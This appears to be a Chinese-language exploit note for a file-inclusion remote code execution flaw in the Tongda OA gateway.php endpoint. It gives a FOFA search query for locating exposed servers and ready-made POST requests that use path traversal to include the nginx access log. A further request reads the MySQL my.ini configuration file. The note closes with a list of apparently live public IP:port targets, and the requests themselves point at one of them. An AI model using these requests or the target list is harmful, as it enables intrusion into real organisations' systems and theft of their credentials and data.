# 通达OA gateway.php文件包含rce

    ## fofa

```
app="TDXK-通达OA"
```

## ispirit/interface/gateway.php

```
POST /ispirit/interface/gateway.php HTTP/1.1
Host: 60.190.185.74:88
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
Content-Length: 54

json={"url":"/general/../../nginx/logs/oa.access.log"}
```

## mac/gateway.php

```
POST /mac/gateway.php HTTP/1.1
Host: 60.190.185.74:88
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
Content-Length: 54

json={"url":"/general/../../nginx/logs/oa.access.log"}
```

## 包含my.ini

```
http://60.190.185.74:88/mac/gateway.php?json={"url":"/general/../../mysql5/my.ini"}
```

## 例子

```
124.88.210.76:888
218.16.142.55:8888
218.70.17.86:88
60.190.185.74:88
60.6.214.120:88
```
